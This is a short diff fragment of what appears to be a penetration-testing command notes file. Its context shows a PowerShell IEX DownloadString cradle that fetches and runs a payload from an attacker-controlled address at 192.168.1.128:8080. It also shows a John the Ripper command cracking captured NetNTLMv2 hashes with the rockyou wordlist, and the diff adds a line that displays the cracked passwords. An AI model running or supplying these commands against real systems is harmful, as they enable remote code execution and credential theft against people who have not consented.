@@ -18,3 +18,7 @@ IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.128:8080/payload
 
 john --wordlist=/usr/share/wordlists/rockyou.txt --format=netntlmv2 hash_john.txt
 
+john --show --format=netntlmv2 hash_john.txt
+
+
+
